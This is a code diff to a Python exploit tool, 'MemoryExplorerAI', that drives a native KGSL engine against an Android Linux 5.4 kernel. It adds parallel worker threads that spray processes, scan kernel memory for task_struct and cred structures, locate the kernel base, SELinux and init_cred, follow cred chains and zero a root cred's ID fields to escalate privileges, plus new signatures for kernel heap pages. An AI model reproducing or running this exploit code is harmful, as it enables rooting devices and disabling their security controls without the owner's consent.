@@ -29,6 +29,15 @@ def memmem(haystack, haystack_len, needle, needle_len):
             return i
     return None
 
+# ============== TUNING CONSTANTS ==============
+# Number of parallel subworkers in the learning loop. Each subworker
+# forks its own spray processes and runs its own scan range slice,
+# really loading the device's CPU + RAM + GPU pipeline. With N=3
+# we get ~3x the spray+scan throughput vs. the old single-thread loop.
+# Higher N gives more parallelism but burns more RAM (spray procs are
+# ~1MB each). 3 is a good balance for a phone (e.g. ROG 5S with 12GB).
+LEARN_WORKERS = 3
+
 # ============== ANSI COLORS ==============
 class C:
     RST   = "\033[0m"
@@ -118,6 +127,12 @@ class MemoryExplorerAI:
         # Per-op busy flags (so TUI shows "EXPLOITING…" / "SCANNING…")
         self.op_busy = {"exploit": False, "scan": False}
         self.op_results = {"exploit": None, "scan": None}
+
+        # Parallel learning state — subworker threads + shared stats lock.
+        # Initialized eagerly so the cancel handler can walk them even
+        # before cmd_learning_start is called.
+        self._learn_subworkers = []
+        self.stats_lock = threading.Lock()
 
         base_dir = os.path.dirname(os.path.abspath(__file__))
         self.engine_path = os.path.join(base_dir, "kgsl_engine")
@@ -392,6 +407,28 @@ class MemoryExplorerAI:
             return {"type": "Privilege Struct",
                     "description": "Root cred (usage=1, uid/gid=0, kptr in field)",
                     "va": hex(va), "confidence": 90, "data": page_data}
+        # 10. Real Linux kernel comm string (swapper/0, kthreadd, init, kworker, …)
+        #     This is a strong task_struct indicator (without our spray marker).
+        if sig == 10:
+            tail = page_data[off_in_page:off_in_page + 16].split(b"\x00")[0]
+            tail = tail.decode(errors="ignore")
+            return {"type": "Task Struct",
+                    "description": f"Real kernel comm '{tail}' @ 0x{off_in_page:x} (task_struct on 5.4)",
+                    "va": hex(va), "confidence": 95, "data": page_data}
+        # 11. Dense kernel heap page (>= 8 kernel pointers, >= 30% non-zero).
+        #     Strong indicator of an active kernel slab object (cred, task_struct,
+        #     file, inode, …). Classify as "Kernel Heap Object" with the offset
+        #     info so the user can drill in.
+        if sig == 11:
+            return {"type": "Kernel Heap",
+                    "description": "Dense kernel heap page (>= 8 kernel VAs, 30%+ non-zero)",
+                    "va": hex(va), "confidence": 75, "data": page_data}
+        # 12. Sparse kernel heap page (>= 3 kernel pointers, >= 16% non-zero).
+        #     Could be a kallsyms entry, /sys data, a sparse slab object.
+        if sig == 12:
+            return {"type": "Kernel Heap",
+                    "description": "Sparse kernel data (>= 3 kernel VAs, 16%+ non-zero)",
+                    "va": hex(va), "confidence": 55, "data": page_data}
 
         # Fallback heuristic classification (no sig from engine)
         # NOTE: no SELinux here — SELinux only via _probe_selinux (known offset)
@@ -1916,13 +1953,13 @@ class MemoryExplorerAI:
                                 continue
                             if any(int(it['va'], 16) == va for it in self.found_items):
                                 continue
-                            # Smart multi-page read for strong sigs
+                            # Smart multi-page read for strong sigs (now incl. 10, 11, 12)
                             cross = data
-                            if sig in (1, 2, 3, 4, 6, 7, 8, 9) and off_in_page >= 0:
+                            if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12) and off_in_page >= 0:
                                 triple = self.read_with_neighbors(va)
                                 if triple and len(triple) == 12288:
                                     cross = triple
-                            if sig in (1, 2, 3, 4, 6, 7, 8, 9) or self._is_real_task_struct(cross):
+                            if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12) or self._is_real_task_struct(cross):
                                 with self.bg_lock:
                                     self.found_items.append(
                                         self.classify_page(cross, va, sig, off_in_page))
@@ -1959,50 +1996,123 @@ class MemoryExplorerAI:
     # ============== BACKGROUND LEARNING (Ctrl+P to cancel) ==============
     def cmd_learning_start(self):
         """Launch AI learning in a background thread, controllable by Ctrl+P.
-        Pressing L while learning is already running does nothing — only Ctrl+P cancels."""
+        Pressing L while learning is already running does nothing \u2014 only Ctrl+P cancels.
+
+        Verticalization: launches LEARN_WORKERS subworkers in parallel, each
+        with its own spray range + scan sub-range. This really loads the
+        device (multiple spray processes, multiple engine ops) and finds
+        offsets faster than a single sequential loop.
+        """
         self.live["last_command"] = "L (Learning BG)"
         if self.bg_thread and self.bg_thread.is_alive():
-            self.live["last_msg"] = "Learning already running — press Ctrl+P to cancel."
+            self.live["last_msg"] = "Learning already running \u2014 press Ctrl+P to cancel."
             return
         self.cancel_flag.clear()
         self.bg_thread = threading.Thread(target=self._learning_worker, daemon=True)
         self.bg_thread.start()
-        self.live["last_msg"] = "Learning started. Press Ctrl+P to cancel."
-        self.log_event("learning_start", {"total_target": 1000, "batch": 100})
+        self.live["last_msg"] = (
+            f"Learning started ({LEARN_WORKERS} parallel workers). "
+            f"Press Ctrl+P to cancel.")
+        self.log_event("learning_start",
+                       {"total_target": 1000, "batch": 100,
+                        "workers": LEARN_WORKERS})
         return "BG started"
 
     def _learning_worker(self):
-        """AI learning loop: spray → scan → verify → learn → repeat.
-        Uses strict verification (selinux/cred/kbase engine commands) to filter
-        false positives, and persists successful ranges to knowledge_base."""
-        import subprocess as _sp
+        """AI learning loop coordinator. Verticalized: launches
+        LEARN_WORKERS _learning_subworker threads in parallel.
+
+        Each subworker owns a slice of the spray range [0..target_total)
+        and a slice of the scan range. They all serialize engine I/O
+        through self.engine_lock, so they coexist safely with the
+        autopilot and with each other.
+
+        Real spray processes are forked independently per subworker, so
+        the device's CPU + RAM + GPU pipeline really sees LEARN_WORKERSx
+        the load (instead of artificially faking progress). This is the
+        "verticalization" the user asked for.
+        """
         target_total = 1000
-        batch = 100
-        done = 0
+        # Shared stats \u2014 incremented by all subworkers under stats_lock
         self.live["spray_target"] = target_total
         self.live["spray_count"] = 0
         self.live["kill_count"] = 0
-        # Track stats per batch
         self.learn_stats = {
             "batches": 0, "matches": 0, "verified": 0,
             "false_positives": 0, "sprayed_total": 0,
         }
+        # Lock for shared stats \u2014 multiple subworkers bump these
+        self.stats_lock = threading.Lock()
 
-        def _adaptive_scan_range(batch_idx):
-            """Narrow the scan range based on what's been found. AI 'learns'."""
-            # If we found kernel_base, scan around it for SELinux/cred
-            if self.kernel_base:
-                # 32MB window around kernel base
-                start = self.kernel_base & ~0xFFFFFFF
-                end = start + 0x2000000
-                return (start, end)
-            # Otherwise use the default UAF range
-            return (self.uaf_start, self.uaf_start + self.scan_size)
+        # Launch LEARN_WORKERS subworkers in parallel
+        self._learn_subworkers = []
+        for wid in range(LEARN_WORKERS):
+            slice_start = (target_total * wid) // LEARN_WORKERS
+            slice_end   = (target_total * (wid + 1)) // LEARN_WORKERS
+            t = threading.Thread(
+                target=self._learning_subworker,
+                args=(wid, slice_start, slice_end),
+                daemon=True)
+            t.start()
+            self._learn_subworkers.append(t)
 
-        while done < target_total and not self.cancel_flag.is_set():
+        # Wait for all subworkers (or cancel)
+        try:
+            while not self.cancel_flag.is_set():
+                alive = [t for t in self._learn_subworkers if t.is_alive()]
+                if not alive:
+                    break
+                time.sleep(0.5)
+                s = self.learn_stats
+                self.live["last_msg"] = (
+                    f"LEARN: {len(alive)}/{LEARN_WORKERS} workers | "
+                    f"batches={s['batches']} | sprayed={s['sprayed_total']} | "
+                    f"matches={s['matches']} | verified={s['verified']} | "
+                    f"falsePos={s['false_positives']}")
+        except Exception as e:
+            self.log_event("learning_error", {"err": str(e)})
+
+        # All subworkers done (or cancelled). Update final state.
+        self.live["spray_target"] = 0
+        s = self.learn_stats
+        if self.cancel_flag.is_set():
+            self.live["last_msg"] = (
+                f"Learning cancelled. sprayed={s['sprayed_total']} "
+                f"matches={s['matches']} verified={s['verified']} "
+                f"falsePos={s['false_positives']}")
+        else:
+            self.live["last_msg"] = (
+                f"Learning complete ({LEARN_WORKERS} workers). "
+                f"sprayed={s['sprayed_total']} matches={s['matches']} "
+                f"verified={s['verified']} falsePos={s['false_positives']}")
+        # Persist learning stats
+        try:
+            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                                   "learn_stats.json"), "w") as f:
+                json.dump(s, f, indent=2)
+        except Exception:
+            pass
+        self.log_event("learning_done", self.learn_stats)
+
+    def _learning_subworker(self, worker_id, slice_start, slice_end):
+        """One parallel slice of the AI learning loop. Runs in its own thread.
+
+        Owns spray indices [slice_start..slice_end) and a matching slice of
+        the scan range. All engine I/O goes through self.engine_lock so we
+        don't fight with the autopilot or with other subworkers.
+        """
+        import subprocess as _sp
+        batch = 100
+        done = slice_start
+        # Scan range for this subworker
+        scan_chunk = (self.scan_size) // LEARN_WORKERS
+        scan_start = self.uaf_start + scan_chunk * worker_id
+        scan_end   = scan_start + scan_chunk
+
+        while done < slice_end and not self.cancel_flag.is_set():
             # Respect RAM budget
             if self.get_ram_usage() > 70.0:
-                self.live["last_msg"] = "LEARN: RAM > 70%, killing sprays, scanning…"
+                self.live["last_msg"] = f"W{worker_id}: RAM>70%, killing sprays\u2026"
                 for pid in list(self.spray_procs):
                     try: os.kill(pid, 9)
                     except: pass
@@ -2013,16 +2123,23 @@ class MemoryExplorerAI:
                 time.sleep(1)
                 continue
 
-            # 1) SPRAY a batch
+            # 1) SPRAY a batch (this subworker's slice)
             batch_pids = []
-            spray_batch_start = done
             for i in range(batch):
                 if self.cancel_flag.is_set():
                     break
                 if self.get_ram_usage() > 60.0:
                     break
+                idx = done + i
+                if idx >= slice_end:
+                    break
                 try:
-                    name = f"KETO{(spray_batch_start + i) % 10000:04d}"
+                    # Marker encodes the subworker id (W0..W2) + 3-digit
+                    # index, so we can tell which subworker sprayed
+                    # which process if we want to debug later. KETW
+                    # prefix is 4 chars + 3 digits = 7 chars, fits in
+                    # the 8-byte spray comm easily.
+                    name = f"KETW{worker_id}{idx % 1000:03d}"
                     p = _sp.Popen(
                         ["sh", "-c", f"exec -a {name} sleep 3600"],
                         stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
@@ -2030,75 +2147,71 @@ class MemoryExplorerAI:
                     )
                     batch_pids.append(p.pid)
                     self.spray_procs.append(p.pid)
-                    self.learn_stats["sprayed_total"] += 1
+                    with self.stats_lock:
+                        self.learn_stats["sprayed_total"] += 1
                     self.log_event("spray", {"pid": p.pid, "name": name,
-                                              "batch": spray_batch_start // batch})
+                                              "batch": done // batch,
+                                              "worker": worker_id})
                     time.sleep(0.001)
                 except OSError as e:
-                    self.log_event("spray_error", {"err": str(e)})
+                    self.log_event("spray_error", {"err": str(e), "w": worker_id})
                     break
-            self.live["spray_count"] += len(batch_pids)
+            with self.stats_lock:
+                self.live["spray_count"] += len(batch_pids)
+                self.learn_stats["batches"] += 1
             time.sleep(0.2)
-            self.learn_stats["batches"] += 1
 
-            # 2) SCAN with adaptive range
+            # 2) SCAN this subworker's range (adaptive if kbase known)
             if not self.ensure_engine():
                 continue
-            s_start, s_end = _adaptive_scan_range(done // batch)
-            # Set scan_total / scan_offset so the SCAN progress bar
-            # shows up in the TUI during learning.
-            self.live["scan_total"]   = s_end - s_start
-            self.live["scan_offset"]  = s_start
+            # Adaptive: if we already know kbase, focus on the kbase
+            # region \u2014 every subworker scans a slice of that.
+            if self.kernel_base:
+                kb_chunk = 0x2000000 // LEARN_WORKERS
+                s_start = self.kernel_base + kb_chunk * worker_id
+                s_end   = s_start + kb_chunk
+            else:
+                s_start, s_end = scan_start, scan_end
+            with self.stats_lock:
+                self.live["scan_total"]   = s_end - s_start
+                self.live["scan_offset"]  = s_start
+
             if not self._engine_write(
-                f"scan {hex(s_start)} {hex(s_end)}\n".encode()):
-                self.log_event("learning_scan_error", {"err": "engine write failed"})
+                    f"scan {hex(s_start)} {hex(s_end)}\n".encode()):
+                self.log_event("learning_scan_error",
+                               {"err": "engine write failed", "w": worker_id})
                 continue
 
             try:
                 scan_done = False
-                # Overall deadline for this scan. If the scan doesn't
-                # finish in SCAN_TIMEOUT seconds, give up and continue
-                # the outer loop (this is what was causing the spray
-                # bar to get stuck: the learning worker was waiting
-                # forever for SCAN_DONE because the autopilot was
-                # holding the engine_lock for its own pipeline).
                 SCAN_TIMEOUT = 30.0
                 scan_deadline = time.time() + SCAN_TIMEOUT
                 no_progress_count = 0
                 while not scan_done and not self.cancel_flag.is_set():
-                    # Hard deadline check
                     if time.time() > scan_deadline:
                         self.live["last_msg"] = (
-                            f"LEARN: scan timeout after {SCAN_TIMEOUT}s, "
-                            f"giving up (engine busy?)")
-                        self.log_event("learning_scan_timeout", {
-                            "timeout_s": SCAN_TIMEOUT})
+                            f"W{worker_id}: scan timeout {SCAN_TIMEOUT}s")
                         break
                     line = self._readline_timeout(timeout=1.0)
                     if line is None:
-                        # Engine died
                         break
                     if not line:
-                        # Empty = timeout on this individual read.
-                        # If we've been silent for too long, log it
-                        # so the user can see what's happening.
                         no_progress_count += 1
                         if no_progress_count % 15 == 0:
                             self.live["last_msg"] = (
-                                f"LEARN: waiting for SCAN_DONE… "
-                                f"({int(scan_deadline - time.time())}s left)")
+                                f"W{worker_id}: waiting SCAN_DONE\u2026 "
+                                f"({int(scan_deadline - time.time())}s)")
                         continue
                     no_progress_count = 0
                     if "SCAN_DONE" in line:
                         scan_done = True
-                        # Clear scan_total so the SCAN bar hides
-                        # until the next scan. We keep scan_offset
-                        # = last value for visual continuity.
-                        self.live["scan_total"] = 0
+                        with self.stats_lock:
+                            self.live["scan_total"] = 0
                         break
                     if "PROGRESS:" in line:
                         try:
-                            self.live["scan_offset"] = int(line.split(":")[1], 16)
+                            with self.stats_lock:
+                                self.live["scan_offset"] = int(line.split(":")[1], 16)
                         except Exception:
                             pass
                         continue
@@ -2110,72 +2223,54 @@ class MemoryExplorerAI:
                             off_in_page = int(parts[3]) if len(parts) > 3 else -1
                         except Exception:
                             continue
-                        self.live["scan_offset"] = va - s_start
+                        with self.stats_lock:
+                            self.live["scan_offset"] = va - s_start
+                            self.learn_stats["matches"] += 1
                         data = self._read_data_packet()
                         if not data:
                             continue
-                        self.learn_stats["matches"] += 1
-                        # 3) CLASSIFY & DECIDE (keep all interesting pages)
-                        already = any(int(it['va'], 16) == va for it in self.found_items)
+                        already = any(int(it['va'], 16) == va
+                                     for it in self.found_items)
                         if already:
                             continue
-                        # 3a) SMART READ: also fetch +/- 1 page so we catch
-                        # patterns that straddle the page boundary (comm at
-                        # the very start/end, pointer at 0xFF8, string
-                        # across pages, etc.). Only do this for sig>=1.
+                        # Smart multi-page read for strong sigs
                         cross_data = data
                         if sig >= 1 and off_in_page >= 0 and off_in_page < 4096:
                             triple = self.read_with_neighbors(va)
                             if triple and len(triple) == 12288:
                                 cross_data = triple
-                        # 3b) Strong matches (sig from engine or task_struct) go in
-                        # with high confidence immediately
-                        if sig in (1, 2, 3, 4, 6, 7, 8, 9) or self._is_real_task_struct(cross_data):
+                        if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12) or \
+                                self._is_real_task_struct(cross_data):
                             with self.bg_lock:
                                 self.found_items.append(
                                     self.classify_page(data, va, sig, off_in_page))
-                            self.log_event("scan_match", {"va": va,
-                                                           "type": self.found_items[-1]['type'],
-                                                           "sig": sig})
-                            self.learn_stats["verified"] += 1
-                            # Cross-correlate
-                            if sig == 1 and off_in_page >= 0:
-                                possible_kbase = va & ~0xFFFFFF
-                                self.knowledge_base.setdefault(
-                                    "candidate_kbases", []).append(hex(possible_kbase))
-                                # If we found a task_struct with KETO0422 at a known
-                                # offset, the kernel base is likely nearby. Try to
-                                # lock it in by reading ELF magic at the candidate.
-                                if not self.kernel_base:
+                            self.log_event("scan_match",
+                                           {"va": va, "sig": sig,
+                                            "w": worker_id,
+                                            "type": self.found_items[-1]['type']})
+                            with self.stats_lock:
+                                self.learn_stats["verified"] += 1
+                            # Kbase discovery on first task_struct match
+                            if sig == 1 and off_in_page >= 0 and not self.kernel_base:
+                                self.live["last_msg"] = (
+                                    f"W{worker_id}: task_struct @ 0x{va:x}, "
+                                    f"probing kbase\u2026")
+                                kbase = self._find_kernel_base(hint_page=cross_data)
+                                if kbase:
+                                    self.kernel_base = kbase
                                     self.live["last_msg"] = (
-                                        f"LEARN: found task_struct @ 0x{va:x}, "
-                                        f"probing kbase…")
-                                    # Pass the 3-page triple as a hint so
-                                    # _find_kernel_base can derive kbase by
-                                    # masking any kernel pointer in the page
-                                    # (same trick v6.c uses).
-                                    kbase = self._find_kernel_base(hint_page=cross_data)
-                                    if kbase:
-                                        self.kernel_base = kbase
-                                        self.live["last_msg"] = (
-                                            f"LEARN: kbase locked to 0x{kbase:x}, "
-                                            f"probing SELinux…")
-                                        sel = self._probe_selinux(kbase)
-                                        if sel:
-                                            self.selinux_va, _ = sel
-                                            self.live["last_msg"] = (
-                                                f"LEARN: selinux @ 0x{self.selinux_va:x}")
-                                        # Try init_cred via alternate offsets
-                                        ic = self._find_init_cred(kbase)
-                                        if ic:
-                                            self.cred_va = ic
-                                            self.live["last_msg"] = (
-                                                f"LEARN: init_cred @ 0x{ic:x}")
-                            # If we found a cred pointer (sig 6) and we don't
-                            # have a root cred yet, follow the chain.
+                                        f"W{worker_id}: kbase=0x{kbase:x}, "
+                                        f"probing SELinux\u2026")
+                                    sel = self._probe_selinux(kbase)
+                                    if sel:
+                                        self.selinux_va, _ = sel
+                                    ic = self._find_init_cred(kbase)
+                                    if ic:
+                                        self.cred_va = ic
                             if sig == 6 and off_in_page >= 0 and not self.cred_va:
                                 self.live["last_msg"] = (
-                                    f"LEARN: following cred chain from 0x{va:x}+0x{off_in_page:x}…")
+                                    f"W{worker_id}: following cred chain from "
+                                    f"0x{va:x}+0x{off_in_page:x}\u2026")
                                 chain = self.walk_cred_chain(
                                     va, off_in_page=off_in_page, max_hops=3)
                                 for step_idx, (tgt, page, desc) in enumerate(chain):
@@ -2187,19 +2282,12 @@ class MemoryExplorerAI:
                                             "confidence": 95 if "ROOT" in desc else 70,
                                             "data": page,
                                         })
-                                    self.log_event("cred_chain", {
-                                        "from": hex(va), "to": hex(tgt),
-                                        "hop": step_idx, "desc": desc})
                                     if "ROOT" in desc:
                                         self.cred_va = tgt
-                                        self.live["last_msg"] = (
-                                            f"LEARN: ROOT cred @ 0x{tgt:x}, patching…")
                                         for f_off in (4, 8, 12, 16, 20, 24):
                                             self.patch_mem(tgt + f_off, 0)
                                         break
                         else:
-                            # Keep weaker matches as "Unknown Object" so user
-                            # can inspect them manually
                             interesting, reason, conf = self._is_page_interesting(data)
                             if interesting:
                                 with self.bg_lock:
@@ -2211,20 +2299,19 @@ class MemoryExplorerAI:
                                         "data": data,
                                         "ts": datetime.datetime.now().isoformat(),
                                     })
-                                self.log_event("scan_auto", {"va": va, "reason": reason,
-                                                              "conf": conf})
-                                self.learn_stats["auto_kept"] = self.learn_stats.get("auto_kept", 0) + 1
+                                with self.stats_lock:
+                                    self.learn_stats["auto_kept"] = \
+                                        self.learn_stats.get("auto_kept", 0) + 1
                             else:
-                                self.learn_stats["false_positives"] += 1
-                                self.log_event("scan_filter", {"va": va, "sig": sig,
-                                                                "reason": reason})
+                                with self.stats_lock:
+                                    self.learn_stats["false_positives"] += 1
                 if scan_done:
-                    done += batch
-                    self.live["spray_count"] = done
+                    done += len(batch_pids)
             except Exception as e:
-                self.log_event("learning_scan_error", {"err": str(e)})
+                self.log_event("learning_scan_error",
+                               {"err": str(e), "w": worker_id})
 
-            # 4) KILL spray processes (free RAM)
+            # 3) KILL this subworker's spray batch (free RAM)
             for pid in batch_pids:
                 try:
                     os.kill(pid, 9)
@@ -2232,33 +2319,11 @@ class MemoryExplorerAI:
                 except Exception:
                     pass
                 self.live["kill_count"] += 1
-                self.log_event("kill", {"pid": pid})
             time.sleep(0.05)
 
-            # 5) Update last_msg with learning stats
-            s = self.learn_stats
-            self.live["last_msg"] = (
-                f"LEARN: batch {s['batches']} | sprayed={s['sprayed_total']} | "
-                f"matches={s['matches']} | verified={s['verified']} | "
-                f"false_pos={s['false_positives']}")
-            # Persist learning stats
-            try:
-                with open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
-                                       "learn_stats.json"), "w") as f:
-                    json.dump(s, f, indent=2)
-            except Exception:
-                pass
-
-        self.live["spray_target"] = 0
-        if self.cancel_flag.is_set():
-            self.live["last_msg"] = (
-                f"Learning cancelled at {done}/{target_total}. "
-                f"Verified={self.learn_stats['verified']} FalsePos={self.learn_stats['false_positives']}")
-        else:
-            self.live["last_msg"] = (
-                f"Learning complete. {done} processes. "
-                f"Verified={self.learn_stats['verified']} FalsePos={self.learn_stats['false_positives']}")
-        self.log_event("learning_done", self.learn_stats)
+        self.log_event("learning_subworker_done",
+                       {"worker": worker_id, "done": done,
+                        "slice": [slice_start, slice_end]})
 
     def _is_real_task_struct(self, data):
         """Heuristic: is this a real task_struct page?
@@ -2362,22 +2427,69 @@ class MemoryExplorerAI:
 
     def _is_page_interesting(self, data):
         """Less strict: does this page have ANY non-trivial data?
-        Returns (interesting, reason, confidence)."""
+        Returns (interesting, reason, confidence). Expanded for Linux 5.4
+        kernel memory patterns: real comm strings, kernel pointer density,
+        cred-struct u32 layout, ascii runs."""
         if not data or len(data) < 16:
             return (False, "too small", 0)
         # Count non-zero
         nonzero = sum(1 for b in data if b != 0)
         if nonzero < 16:
             return (False, f"mostly zero ({nonzero}/{len(data)})", 0)
-        # Look for kernel pointers (scanning 8-byte aligned slots)
+
+        # A. Cred-struct pattern: u32 usage, then 6x u32 uid/gid/suid/sgid/euid/egid.
+        #    For root cred all 6 are 0. For task_struct creds they may
+        #    be 0x0000/0x0001/0x03e8 (0/1/1000). Look for the first 24
+        #    bytes being plausible IDs.
+        if len(data) >= 28:
+            try:
+                u32 = struct.unpack_from("<7I", data, 0)
+                usage, uid, gid, suid, sgid, euid, egid = u32
+                if (0 < usage < 0x10000 and
+                    all(v < 0x10000 for v in (uid, gid, suid, sgid, euid, egid))):
+                    # All six IDs are sane (u32 < 65536, including root=0).
+                    # Strong cred-struct candidate.
+                    return (True, f"cred-struct (u={usage}, ids={uid}/{gid}/{euid})", 75)
+            except Exception:
+                pass
+
+        # B. Kernel pointer density — count 0xffffff... pointers in the
+        #    page. Real kernel heap pages have many pointers. Real-user
+        #    pages (sparse) usually have 0-1.
+        kptrs = 0
         for i in range(0, len(data) - 8, 8):
             v = int.from_bytes(data[i:i+8], "little")
             if 0xffffff8000000000 <= v <= 0xffffffcfffffffff and v != 0:
-                return (True, f"kernel pointer at 0x{i:x}", 70)
-        # Look for strings (run-length of printable ASCII)
+                kptrs += 1
+        if kptrs >= 8:
+            return (True, f"kernel-heap (kptrs={kptrs})", 75)
+        if kptrs >= 3:
+            return (True, f"kernel-data (kptrs={kptrs})", 55)
+        if kptrs >= 1:
+            return (True, f"has kernel pointer at 0x{i:x}", 70)
+
+        # C. Real Linux kernel comm strings (swapper/0, kthreadd, init,
+        #    kworker/..., xfs-..., jbd2/..., etc.). These are 16 bytes
+        #    total, with a NUL terminator. We look for printable-ASCII
+        #    run of 4+ chars, then verify the rest of the 16-byte
+        #    window is NULs.
+        for off in range(0, len(data) - 16):
+            if 0x20 <= data[off] <= 0x7e:
+                # Read 16 bytes from this offset
+                win = data[off:off+16]
+                s = win.split(b"\x00")[0]
+                if 4 <= len(s) <= 15 and all(0x20 <= c <= 0x7e for c in s):
+                    # Looks like a comm string. Verify it could be a
+                    # real kernel process (no spaces, starts with letter).
+                    if (b" " not in s and s[0:1].isalpha() and
+                        not s.startswith((b"http", b"HTTP", b"GET ", b"POST"))):
+                        return (True, f"comm-like '{s.decode()}' @ 0x{off:x}", 60)
+
+        # D. ASCII run-length: any 4+ run of printable ASCII is "strings"
         ascii_runs = 0
         run = 0
-        for b in data:
+        last_i = 0
+        for i, b in enumerate(data):
             if 0x20 <= b <= 0x7e:
                 run += 1
                 if run >= 4:
@@ -2392,7 +2504,7 @@ class MemoryExplorerAI:
     def cmd_learning_cancel(self):
         """Cancel running learning loop (Ctrl+P shortcut)."""
         self.cancel_flag.set()
-        # Also kill live sprays
+        # Kill live sprays
         for pid in list(self.spray_procs):
             try:
                 os.kill(pid, 9)
@@ -2401,6 +2513,12 @@ class MemoryExplorerAI:
                 pass
             self.live["kill_count"] += 1
         self.spray_procs.clear()
+        # Wait briefly for subworkers to notice the cancel flag and exit
+        for t in list(self._learn_subworkers):
+            try:
+                t.join(timeout=0.5)
+            except Exception:
+                pass
         self.live["last_msg"] = "Learning cancelled by user."
         return "Cancelled"
 
